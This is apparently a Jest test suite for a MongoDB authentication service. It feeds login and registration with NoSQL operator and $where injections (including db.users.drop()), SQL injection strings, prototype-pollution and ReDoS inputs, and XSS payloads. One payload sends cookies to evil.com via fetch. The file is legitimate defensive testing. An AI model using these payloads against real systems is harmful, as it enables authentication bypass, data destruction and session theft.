import { AuthApplicationService } from '@/application/services/AuthService';
import { IUserRepository, IAuthService, User } from '@/domain';

/**
 * Security/Penetration Tests for Authentication with MongoDB
 * Tests common attack vectors and security vulnerabilities specific to MongoDB
 */

const createMockUser = (id: string = 'user-sec-123'): User => ({
  _id: id,
  email: 'secure@example.com',
  password: 'hashedSecurePassword',
  name: 'Secure User',
  studentProfile: 'Computer Science',
  favoriteModules: [],
  chosenModules: [],
  createdAt: new Date('2026-01-01'),
  updatedAt: new Date('2026-01-01')
});

describe('Security Tests - NoSQL Injection Attacks (MongoDB)', () => {
  let mockUserRepo: jest.Mocked<IUserRepository>;
  let mockAuthService: jest.Mocked<IAuthService>;
  let authService: AuthApplicationService;

  beforeEach(() => {
    mockUserRepo = {
      existsByEmail: jest.fn(),
      create: jest.fn(),
      findByEmail: jest.fn(),
      findById: jest.fn(),
      update: jest.fn(),
      delete: jest.fn()
    } as any;

    mockAuthService = {
      hashPassword: jest.fn(),
      comparePasswords: jest.fn(),
      generateToken: jest.fn(),
      verifyToken: jest.fn()
    } as any;

    authService = new AuthApplicationService(mockUserRepo, mockAuthService);
  });

  test('prevents MongoDB operator injection in email field', async () => {
    // MongoDB operator injection attempts
    const mongoInjectionAttempts = [
      { $ne: null },                              // Not equal to null (bypass authentication)
      { $ne: "" },                                // Not equal to empty string
      { $gt: "" },                                // Greater than empty string
      { $regex: ".*" },                           // Regex match all
      { $where: "1==1" },                         // JavaScript execution
      { $exists: true },                          // Field exists check
      { $nin: [] },                               // Not in empty array
      "admin' || '1'=='1",                        // SQL-style injection attempt in MongoDB
      '{"$ne": null}',                            // JSON-encoded operator
      '{"$gt": ""}',                              // JSON-encoded greater than
      '{"$regex": "^admin"}',                     // JSON-encoded regex
    ];

    mockUserRepo.findByEmail.mockResolvedValue(null);

    for (const maliciousInput of mongoInjectionAttempts) {
      const emailValue = typeof maliciousInput === 'string' 
        ? maliciousInput 
        : JSON.stringify(maliciousInput);

      await expect(
        authService.login({
          email: emailValue,
          password: 'password'
        })
      ).rejects.toThrow('Invalid email or password');

      expect(mockUserRepo.findByEmail).toHaveBeenCalledWith(emailValue);
    }
  });

  test('prevents MongoDB $where clause injection', async () => {
    // $where clause allows arbitrary JavaScript execution in MongoDB
    const whereInjections = [
      '{"$where": "this.password.match(/.*/)"}',
      '{"$where": "return true"}',
      '{"$where": "sleep(5000)"}',                 // DoS attack
      '{"$where": "db.users.drop()"}',             // Database destruction
      '{"$where": "function(){return(this.email.match(/.*@.*/));}"}',
      'admin\'; return true; var foo=\'bar',       // JavaScript injection
    ];

    mockUserRepo.findByEmail.mockResolvedValue(null);

    for (const injection of whereInjections) {
      await expect(
        authService.login({
          email: injection,
          password: 'password'
        })
      ).rejects.toThrow('Invalid email or password');
    }
  });

  test('prevents MongoDB aggregation pipeline injection', async () => {
    const pipelineInjections = [
      '[{"$match": {}}, {"$out": "hacked"}]',     // Output to different collection
      '{"$lookup": {"from": "users", "as": "data"}}', // Join with other collections
      '{"$group": {"_id": null, "data": {"$push": "$$ROOT"}}}', // Extract all data
      '[{"$match": {}}, {"$project": {"password": 1}}]', // Expose passwords
    ];

    mockUserRepo.findByEmail.mockResolvedValue(null);

    for (const injection of pipelineInjections) {
      await expect(
        authService.login({
          email: injection,
          password: 'password'
        })
      ).rejects.toThrow('Invalid email or password');
    }
  });

  test('prevents MongoDB comparison operator injection in login', async () => {
    const user = createMockUser();
    mockUserRepo.findByEmail.mockResolvedValue(user);
    mockAuthService.comparePasswords.mockResolvedValue(false);

    const operatorInjections = [
      '{"$ne": "wrongpassword"}',                 // Not equal (always true)
      '{"$gt": ""}',                              // Greater than empty
      '{"$regex": ".*"}',                         // Match anything
      '{"$in": ["admin", "password", "123456"]}', // In common passwords
    ];

    for (const injection of operatorInjections) {
      await expect(
        authService.login({
          email: 'user@example.com',
          password: injection
        })
      ).rejects.toThrow('Invalid email or password');
    }
  });

  test('prevents BSON injection attacks', async () => {
    // BSON-specific injection attempts
    const bsonInjections = [
      '\x00admin\x00',                            // Null byte injection
      'admin\u0000@example.com',                  // Unicode null
      'test@example.com\x00.attacker.com',        // Domain spoofing with null
    ];

    mockUserRepo.findByEmail.mockResolvedValue(null);

    for (const injection of bsonInjections) {
      await expect(
        authService.login({
          email: injection,
          password: 'password'
        })
      ).rejects.toThrow('Invalid email or password');
    }
  });

  test('prevents JavaScript injection through email field', async () => {
    const jsInjections = [
      'admin@example.com\'; return true; //',
      'test@example.com"; this.password="hacked',
      'user@example.com\'); db.dropDatabase(); //',
      'admin@example.com"; process.exit(); //',
    ];

    mockUserRepo.findByEmail.mockResolvedValue(null);

    for (const injection of jsInjections) {
      await expect(
        authService.login({
          email: injection,
          password: 'password'
        })
      ).rejects.toThrow('Invalid email or password');
    }
  });

  test('prevents regex DoS (ReDoS) attacks in MongoDB queries', async () => {
    // Catastrophic backtracking regex patterns
    const redosPatterns = [
      '(a+)+$',
      '(a|a)*$',
      '(a|ab)*$',
      '^(a+)+$',
      '{"$regex": "(a+)+", "$options": "i"}',
      'test@(example|example)*\\.com',
    ];

    mockUserRepo.findByEmail.mockResolvedValue(null);

    for (const pattern of redosPatterns) {
      await expect(
        authService.login({
          email: pattern,
          password: 'password'
        })
      ).rejects.toThrow('Invalid email or password');
    }
  });
});

describe('Security Tests - SQL Injection Attempts (Legacy)', () => {
  let mockUserRepo: jest.Mocked<IUserRepository>;
  let mockAuthService: jest.Mocked<IAuthService>;
  let authService: AuthApplicationService;

  beforeEach(() => {
    mockUserRepo = {
      existsByEmail: jest.fn(),
      create: jest.fn(),
      findByEmail: jest.fn(),
      findById: jest.fn(),
      update: jest.fn(),
      delete: jest.fn()
    } as any;

    mockAuthService = {
      hashPassword: jest.fn(),
      comparePasswords: jest.fn(),
      generateToken: jest.fn(),
      verifyToken: jest.fn()
    } as any;

    authService = new AuthApplicationService(mockUserRepo, mockAuthService);
  });

  test('handles SQL-style injection attempts (although using MongoDB)', async () => {
    // These won't work on MongoDB but users might still try them
    const sqlInjectionAttempts = [
      "admin' OR '1'='1",
      "admin'--",
      "admin' OR 1=1--",
      "'; DROP TABLE users--",
      "' OR 'x'='x",
    ];

    mockUserRepo.findByEmail.mockResolvedValue(null);

    for (const maliciousEmail of sqlInjectionAttempts) {
      await expect(
        authService.login({
          email: maliciousEmail,
          password: 'password'
        })
      ).rejects.toThrow('Invalid email or password');

      expect(mockUserRepo.findByEmail).toHaveBeenCalledWith(maliciousEmail);
    }
  });
});

describe('Security Tests - MongoDB-Specific Object Injection', () => {
  let mockUserRepo: jest.Mocked<IUserRepository>;
  let mockAuthService: jest.Mocked<IAuthService>;
  let authService: AuthApplicationService;

  beforeEach(() => {
    mockUserRepo = {
      existsByEmail: jest.fn(),
      create: jest.fn(),
      findByEmail: jest.fn(),
      findById: jest.fn(),
      update: jest.fn(),
      delete: jest.fn()
    } as any;

    mockAuthService = {
      hashPassword: jest.fn(),
      comparePasswords: jest.fn(),
      generateToken: jest.fn(),
      verifyToken: jest.fn()
    } as any;

    authService = new AuthApplicationService(mockUserRepo, mockAuthService);
  });

  test('prevents MongoDB object injection in registration', async () => {
    // Attempts to inject MongoDB operators as objects
    const objectInjections = [
      '{"email": {"$gt": ""}}',
      '{"email": {"$ne": null}, "password": {"$ne": null}}',
      '{"$or": [{"email": "admin@example.com"}, {"email": "root@example.com"}]}',
    ];

    mockUserRepo.existsByEmail.mockResolvedValue(false);
    mockAuthService.hashPassword.mockResolvedValue('hashed');
    mockUserRepo.create.mockResolvedValue(createMockUser());
    mockAuthService.generateToken.mockReturnValue('token');

    for (const injection of objectInjections) {
      await authService.register({
        email: injection,
        password: 'Pass123',
        name: 'User',
        studentProfile: 'CS'
      });

      // Service passes string through; repository should handle object parsing safely
      expect(mockUserRepo.existsByEmail).toHaveBeenCalledWith(injection);
    }
  });

  test('prevents prototype pollution through MongoDB queries', async () => {
    // Attempts to pollute JavaScript prototypes
    const pollutionAttempts = [
      '{"__proto__": {"isAdmin": true}}',
      '{"constructor": {"prototype": {"isAdmin": true}}}',
      'admin@example.com", "__proto__": {"polluted": true}',
    ];

    mockUserRepo.findByEmail.mockResolvedValue(null);

    for (const injection of pollutionAttempts) {
      await expect(
        authService.login({
          email: injection,
          password: 'password'
        })
      ).rejects.toThrow('Invalid email or password');
    }
  });

  test('prevents MongoDB $function operator injection (MongoDB 4.4+)', async () => {
    // $function allows arbitrary JavaScript execution
    const functionInjections = [
      '{"$function": {"body": "return true", "args": [], "lang": "js"}}',
      '{"$function": {"body": "db.users.drop()", "args": [], "lang": "js"}}',
    ];

    mockUserRepo.findByEmail.mockResolvedValue(null);

    for (const injection of functionInjections) {
      await expect(
        authService.login({
          email: injection,
          password: 'password'
        })
      ).rejects.toThrow('Invalid email or password');
    }
  });
});

describe('Security Tests - MongoDB Performance DoS Attacks', () => {
  let mockUserRepo: jest.Mocked<IUserRepository>;
  let mockAuthService: jest.Mocked<IAuthService>;
  let authService: AuthApplicationService;

  beforeEach(() => {
    mockUserRepo = {
      existsByEmail: jest.fn(),
      create: jest.fn(),
      findByEmail: jest.fn(),
      findById: jest.fn(),
      update: jest.fn(),
      delete: jest.fn()
    } as any;

    mockAuthService = {
      hashPassword: jest.fn(),
      comparePasswords: jest.fn(),
      generateToken: jest.fn(),
      verifyToken: jest.fn()
    } as any;

    authService = new AuthApplicationService(mockUserRepo, mockAuthService);
  });

  test('handles complex regex patterns that could cause DoS', async () => {
    // These patterns can cause catastrophic backtracking in MongoDB regex
    const dosRegexPatterns = [
      '{"$regex": "^(a+)+$", "$options": "i"}',
      '{"$regex": "^(([a-z])+.)+[A-Z]([a-z])+$"}',
      '{"$regex": "(.*a){10,}"}',  // Excessive repetition
      '{"$regex": "^(a*)*b"}',     // Nested repetition
    ];

    mockUserRepo.findByEmail.mockResolvedValue(null);

    for (const pattern of dosRegexPatterns) {
      await expect(
        authService.login({
          email: pattern,
          password: 'password'
        })
      ).rejects.toThrow('Invalid email or password');
    }
  });

  test('prevents large payload attacks', async () => {
    // Extremely large inputs that could cause memory issues
    const largeEmail = 'a'.repeat(1000000) + '@example.com';
    const largePassword = 'p'.repeat(1000000);

    mockUserRepo.findByEmail.mockResolvedValue(null);

    await expect(
      authService.login({
        email: largeEmail,
        password: largePassword
      })
    ).rejects.toThrow('Invalid email or password');
  });

  test('handles deeply nested JSON structures', async () => {
    // Deeply nested objects can cause stack overflow
    let deeplyNested = '{"a":';
    for (let i = 0; i < 100; i++) {
      deeplyNested += '{"b":';
    }
    deeplyNested += '"value"';
    for (let i = 0; i < 100; i++) {
      deeplyNested += '}';
    }
    deeplyNested += '}';

    mockUserRepo.findByEmail.mockResolvedValue(null);

    await expect(
      authService.login({
        email: deeplyNested,
        password: 'password'
      })
    ).rejects.toThrow('Invalid email or password');
  });
});

describe('Security Tests - XSS (Cross-Site Scripting) Attempts', () => {
  let mockUserRepo: jest.Mocked<IUserRepository>;
  let mockAuthService: jest.Mocked<IAuthService>;
  let authService: AuthApplicationService;

  beforeEach(() => {
    mockUserRepo = {
      existsByEmail: jest.fn(),
      create: jest.fn(),
      findByEmail: jest.fn(),
      findById: jest.fn(),
      update: jest.fn(),
      delete: jest.fn()
    } as any;

    mockAuthService = {
      hashPassword: jest.fn(),
      comparePasswords: jest.fn(),
      generateToken: jest.fn(),
      verifyToken: jest.fn()
    } as any;

    authService = new AuthApplicationService(mockUserRepo, mockAuthService);
  });

  test('handles XSS payloads in name field during registration', async () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')">',
      '"><script>alert(String.fromCharCode(88,83,83))</script>'
    ];

    mockUserRepo.existsByEmail.mockResolvedValue(false);
    mockAuthService.hashPassword.mockResolvedValue('hashed');
    const mockUser = createMockUser();
    mockUserRepo.create.mockResolvedValue(mockUser);
    mockAuthService.generateToken.mockReturnValue('token');

    for (const xssPayload of xssPayloads) {
      const result = await authService.register({
        email: 'xss-test@example.com',
        password: 'Password123',
        name: xssPayload,
        studentProfile: 'CS'
      });

      // Service should accept input (sanitization happens at presentation layer)
      expect(result).toBeDefined();
      expect(mockUserRepo.create).toHaveBeenCalledWith(
        expect.objectContaining({ name: xssPayload })
      );
    }
  });

  test('handles XSS payloads in studentProfile field', async () => {
    const xssPayloads = [
      '<script>document.cookie</script>',
      '<img src=x onerror=fetch("http://evil.com?c="+document.cookie)>'
    ];

    mockUserRepo.existsByEmail.mockResolvedValue(false);
    mockAuthService.hashPassword.mockResolvedValue('hashed');
    mockUserRepo.create.mockResolvedValue(createMockUser());
    mockAuthService.generateToken.mockReturnValue('token');

    for (const xssPayload of xssPayloads) {
      await authService.register({
        email: 'test@example.com',
        password: 'Pass123',
        name: 'User',
        studentProfile: xssPayload
      });

      expect(mockUserRepo.create).toHaveBeenCalledWith(
        expect.objectContaining({ studentProfile: xssPayload })
      );
    }
  });
});

describe('Security Tests - Password Security', () => {
  let mockUserRepo: jest.Mocked<IUserRepository>;
  let mockAuthService: jest.Mocked<IAuthService>;
  let authService: AuthApplicationService;

  beforeEach(() => {
    mockUserRepo = {
      existsByEmail: jest.fn(),
      create: jest.fn(),
      findByEmail: jest.fn(),
      findById: jest.fn(),
      update: jest.fn(),
      delete: jest.fn()
    } as any;

    mockAuthService = {
      hashPassword: jest.fn(),
      comparePasswords: jest.fn(),
      generateToken: jest.fn(),
      verifyToken: jest.fn()
    } as any;

    authService = new AuthApplicationService(mockUserRepo, mockAuthService);
  });

  test('accepts weak passwords (validation should be at presentation layer)', async () => {
    const weakPasswords = [
      '123456',
      'password',
      'qwerty',
      'abc123',
      '111111',
      'letmein',
      'admin',
      'welcome'
    ];

    mockUserRepo.existsByEmail.mockResolvedValue(false);
    mockAuthService.hashPassword.mockResolvedValue('hashed');
    mockUserRepo.create.mockResolvedValue(createMockUser());
    mockAuthService.generateToken.mockReturnValue('token');

    for (const weakPassword of weakPasswords) {
      const result = await authService.register({
        email: 'weak@example.com',
        password: weakPassword,
        name: 'User',
        studentProfile: 'CS'
      });

      // Service accepts it (password policy should be enforced at API/validation layer)
      expect(result).toBeDefined();
      expect(mockAuthService.hashPassword).toHaveBeenCalledWith(weakPassword);
    }
  });

  test('handles extremely long passwords', async () => {
    const longPassword = 'A'.repeat(10000);

    mockUserRepo.existsByEmail.mockResolvedValue(false);
    mockAuthService.hashPassword.mockResolvedValue('hashed-long');
    mockUserRepo.create.mockResolvedValue(createMockUser());
    mockAuthService.generateToken.mockReturnValue('token');

    const result = await authService.register({
      email: 'long@example.com',
      password: longPassword,
      name: 'User',
      studentProfile: 'CS'
    });

    expect(result).toBeDefined();
    expect(mockAuthService.hashPassword).toHaveBeenCalledWith(longPassword);
  });

  test('handles special characters in passwords', async () => {
    const specialPasswords = [
      'P@ssw0rd!#$%',
      'Test<>{}[]|\\',
      'Pass"\'`~',
      'パスワード123', // Japanese characters
      '密码123', // Chinese characters
      'null',
      'undefined',
      'true',
      'false'
    ];

    mockUserRepo.existsByEmail.mockResolvedValue(false);
    mockAuthService.hashPassword.mockResolvedValue('hashed');
    mockUserRepo.create.mockResolvedValue(createMockUser());
    mockAuthService.generateToken.mockReturnValue('token');

    for (const password of specialPasswords) {
      await authService.register({
        email: 'special@example.com',
        password: password,
        name: 'User',
        studentProfile: 'CS'
      });

      expect(mockAuthService.hashPassword).toHaveBeenCalledWith(password);
    }
  });

  test('verifies password is actually hashed before storage', async () => {
    const plainPassword = 'MyPlainPassword123';
    
    mockUserRepo.existsByEmail.mockResolvedValue(false);
    mockAuthService.hashPassword.mockResolvedValue('$2a$12$hashedversion');
    mockUserRepo.create.mockResolvedValue(createMockUser());
    mockAuthService.generateToken.mockReturnValue('token');

    await authService.register({
      email: 'hash-test@example.com',
      password: plainPassword,
      name: 'User',
      studentProfile: 'CS'
    });

    // Verify password was hashed before being passed to repository
    expect(mockAuthService.hashPassword).toHaveBeenCalledWith(plainPassword);
    expect(mockUserRepo.create).toHaveBeenCalledWith(
      expect.objectContaining({ password: '$2a$12$hashedversion' })
    );
    expect(mockUserRepo.create).not.toHaveBeenCalledWith(
      expect.objectContaining({ password: plainPassword })
    );
  });
});

describe('Security Tests - Email Validation Bypass', () => {
  let mockUserRepo: jest.Mocked<IUserRepository>;
  let mockAuthService: jest.Mocked<IAuthService>;
  let authService: AuthApplicationService;

  beforeEach(() => {
    mockUserRepo = {
      existsByEmail: jest.fn(),
      create: jest.fn(),
      findByEmail: jest.fn(),
      findById: jest.fn(),
      update: jest.fn(),
      delete: jest.fn()
    } as any;

    mockAuthService = {
      hashPassword: jest.fn(),
      comparePasswords: jest.fn(),
      generateToken: jest.fn(),
      verifyToken: jest.fn()
    } as any;

    authService = new AuthApplicationService(mockUserRepo, mockAuthService);
  });

  test('handles malformed email addresses', async () => {
    const malformedEmails = [
      'notanemail',
      '@example.com',
      'test@',
      'test..test@example.com',
      'test@example',
      'test @example.com',
      'test@exam ple.com',
      '',
      'null@example.com',
      'undefined@example.com'
    ];

    mockUserRepo.existsByEmail.mockResolvedValue(false);
    mockAuthService.hashPassword.mockResolvedValue('hashed');
    mockUserRepo.create.mockResolvedValue(createMockUser());
    mockAuthService.generateToken.mockReturnValue('token');

    for (const email of malformedEmails) {
      await authService.register({
        email: email,
        password: 'Password123',
        name: 'User',
        studentProfile: 'CS'
      });

      // Service layer accepts it (email validation should be at API/validation layer)
      expect(mockUserRepo.existsByEmail).toHaveBeenCalledWith(email);
    }
  });

  test('handles extremely long email addresses', async () => {
    const longEmail = 'a'.repeat(1000) + '@example.com';

    mockUserRepo.existsByEmail.mockResolvedValue(false);
    mockAuthService.hashPassword.mockResolvedValue('hashed');
    mockUserRepo.create.mockResolvedValue(createMockUser());
    mockAuthService.generateToken.mockReturnValue('token');

    await authService.register({
      email: longEmail,
      password: 'Pass123',
      name: 'User',
      studentProfile: 'CS'
    });

    expect(mockUserRepo.existsByEmail).toHaveBeenCalledWith(longEmail);
  });
});

describe('Security Tests - Account Enumeration', () => {
  let mockUserRepo: jest.Mocked<IUserRepository>;
  let mockAuthService: jest.Mocked<IAuthService>;
  let authService: AuthApplicationService;

  beforeEach(() => {
    mockUserRepo = {
      existsByEmail: jest.fn(),
      create: jest.fn(),
      findByEmail: jest.fn(),
      findById: jest.fn(),
      update: jest.fn(),
      delete: jest.fn()
    } as any;

    mockAuthService = {
      hashPassword: jest.fn(),
      comparePasswords: jest.fn(),
      generateToken: jest.fn(),
      verifyToken: jest.fn()
    } as any;

    authService = new AuthApplicationService(mockUserRepo, mockAuthService);
  });

  test('login returns same error for non-existent user and wrong password', async () => {
    // Non-existent user
    mockUserRepo.findByEmail.mockResolvedValue(null);
    
    let error1;
    try {
      await authService.login({
        email: 'nonexistent@example.com',
        password: 'password'
      });
    } catch (e: any) {
      error1 = e.message;
    }

    // Existing user with wrong password
    mockUserRepo.findByEmail.mockResolvedValue(createMockUser());
    mockAuthService.comparePasswords.mockResolvedValue(false);

    let error2;
    try {
      await authService.login({
        email: 'existing@example.com',
        password: 'wrongpassword'
      });
    } catch (e: any) {
      error2 = e.message;
    }

    // Both should return the same error message to prevent enumeration
    expect(error1).toBe('Invalid email or password');
    expect(error2).toBe('Invalid email or password');
    expect(error1).toBe(error2);
  });

  test('registration reveals if email exists', async () => {
    // This is expected behavior but good to document
    mockUserRepo.existsByEmail.mockResolvedValue(true);

    await expect(
      authService.register({
        email: 'existing@example.com',
        password: 'Pass123',
        name: 'User',
        studentProfile: 'CS'
      })
    ).rejects.toThrow('User with this email already exists');

    // Note: This allows account enumeration, which is often acceptable for registration
    // but should be considered in security design
  });
});

describe('Security Tests - Brute Force Protection', () => {
  let mockUserRepo: jest.Mocked<IUserRepository>;
  let mockAuthService: jest.Mocked<IAuthService>;
  let authService: AuthApplicationService;

  beforeEach(() => {
    mockUserRepo = {
      existsByEmail: jest.fn(),
      create: jest.fn(),
      findByEmail: jest.fn(),
      findById: jest.fn(),
      update: jest.fn(),
      delete: jest.fn()
    } as any;

    mockAuthService = {
      hashPassword: jest.fn(),
      comparePasswords: jest.fn(),
      generateToken: jest.fn(),
      verifyToken: jest.fn()
    } as any;

    authService = new AuthApplicationService(mockUserRepo, mockAuthService);
  });

  test('service layer does not implement rate limiting (should be at API layer)', async () => {
    const user = createMockUser();
    mockUserRepo.findByEmail.mockResolvedValue(user);
    mockAuthService.comparePasswords.mockResolvedValue(false);

    // Simulate multiple rapid login attempts
    const attempts = Array(100).fill(null).map((_, i) => 
      authService.login({
        email: 'target@example.com',
        password: `attempt${i}`
      }).catch(() => {})
    );

    await Promise.all(attempts);

    // Service layer allows all attempts (rate limiting should be at API/middleware layer)
    expect(mockUserRepo.findByEmail).toHaveBeenCalledTimes(100);
  });

  test('multiple failed logins do not lock account at service layer', async () => {
    const user = createMockUser();
    mockUserRepo.findByEmail.mockResolvedValue(user);
    mockAuthService.comparePasswords.mockResolvedValue(false);

    // 10 failed attempts
    for (let i = 0; i < 10; i++) {
      await expect(
        authService.login({
          email: 'user@example.com',
          password: 'wrong'
        })
      ).rejects.toThrow('Invalid email or password');
    }

    // 11th attempt with correct password should succeed
    mockAuthService.comparePasswords.mockResolvedValue(true);
    mockAuthService.generateToken.mockReturnValue('token');

    const result = await authService.login({
      email: 'user@example.com',
      password: 'correct'
    });

    expect(result.token).toBe('token');
    // Note: Account locking should be implemented at a higher layer if needed
  });
});

describe('Security Tests - Token Security', () => {
  let mockUserRepo: jest.Mocked<IUserRepository>;
  let mockAuthService: jest.Mocked<IAuthService>;
  let authService: AuthApplicationService;

  beforeEach(() => {
    mockUserRepo = {
      existsByEmail: jest.fn(),
      create: jest.fn(),
      findByEmail: jest.fn(),
      findById: jest.fn(),
      update: jest.fn(),
      delete: jest.fn()
    } as any;

    mockAuthService = {
      hashPassword: jest.fn(),
      comparePasswords: jest.fn(),
      generateToken: jest.fn(),
      verifyToken: jest.fn()
    } as any;

    authService = new AuthApplicationService(mockUserRepo, mockAuthService);
  });

  test('tokens are generated for each login', async () => {
    const user = createMockUser();
    mockUserRepo.findByEmail.mockResolvedValue(user);
    mockAuthService.comparePasswords.mockResolvedValue(true);
    
    // First login
    mockAuthService.generateToken.mockReturnValue('token1');
    const result1 = await authService.login({
      email: 'user@example.com',
      password: 'password'
    });

    // Second login
    mockAuthService.generateToken.mockReturnValue('token2');
    const result2 = await authService.login({
      email: 'user@example.com',
      password: 'password'
    });

    // Each login should generate a unique token
    expect(result1.token).toBe('token1');
    expect(result2.token).toBe('token2');
    expect(mockAuthService.generateToken).toHaveBeenCalledTimes(2);
  });

  test('token generation uses user ID', async () => {
    const user = createMockUser('secure-user-id-123');
    mockUserRepo.findByEmail.mockResolvedValue(user);
    mockAuthService.comparePasswords.mockResolvedValue(true);
    mockAuthService.generateToken.mockReturnValue('token');

    await authService.login({
      email: 'user@example.com',
      password: 'password'
    });

    // Verify token is generated with the correct user ID
    expect(mockAuthService.generateToken).toHaveBeenCalledWith('secure-user-id-123');
  });
});

describe('Security Tests - Input Sanitization Edge Cases', () => {
  let mockUserRepo: jest.Mocked<IUserRepository>;
  let mockAuthService: jest.Mocked<IAuthService>;
  let authService: AuthApplicationService;

  beforeEach(() => {
    mockUserRepo = {
      existsByEmail: jest.fn(),
      create: jest.fn(),
      findByEmail: jest.fn(),
      findById: jest.fn(),
      update: jest.fn(),
      delete: jest.fn()
    } as any;

    mockAuthService = {
      hashPassword: jest.fn(),
      comparePasswords: jest.fn(),
      generateToken: jest.fn(),
      verifyToken: jest.fn()
    } as any;

    authService = new AuthApplicationService(mockUserRepo, mockAuthService);
  });

  test('handles null bytes in input', async () => {
    const nullByteInputs = [
      'test\x00@example.com',
      'user\x00name',
      'pass\x00word'
    ];

    mockUserRepo.existsByEmail.mockResolvedValue(false);
    mockAuthService.hashPassword.mockResolvedValue('hashed');
    mockUserRepo.create.mockResolvedValue(createMockUser());
    mockAuthService.generateToken.mockReturnValue('token');

    for (const input of nullByteInputs) {
      await authService.register({
        email: input,
        password: input,
        name: input,
        studentProfile: 'CS'
      });

      // Service accepts input (sanitization at lower levels)
      expect(mockUserRepo.create).toHaveBeenCalled();
    }
  });

  test('handles Unicode normalization issues', async () => {
    const unicodeEmails = [
      'café@example.com', // é as single character
      'café@example.com', // é as e + combining accent
      'tëst@example.com',
      'Ṫest@example.com'
    ];

    mockUserRepo.existsByEmail.mockResolvedValue(false);
    mockAuthService.hashPassword.mockResolvedValue('hashed');
    mockUserRepo.create.mockResolvedValue(createMockUser());
    mockAuthService.generateToken.mockReturnValue('token');

    for (const email of unicodeEmails) {
      await authService.register({
        email: email,
        password: 'Pass123',
        name: 'User',
        studentProfile: 'CS'
      });
    }

    // Service passes through (normalization should happen at repo/DB layer)
    expect(mockUserRepo.create).toHaveBeenCalledTimes(unicodeEmails.length);
  });

  test('handles empty strings in required fields', async () => {
    mockUserRepo.existsByEmail.mockResolvedValue(false);
    mockAuthService.hashPassword.mockResolvedValue('hashed');
    mockUserRepo.create.mockResolvedValue(createMockUser());
    mockAuthService.generateToken.mockReturnValue('token');

    await authService.register({
      email: '',
      password: '',
      name: '',
      studentProfile: ''
    });

    // Service accepts empty strings (validation should be at API layer)
    expect(mockUserRepo.create).toHaveBeenCalledWith({
      email: '',
      password: 'hashed',
      name: '',
      studentProfile: ''
    });
  });
});
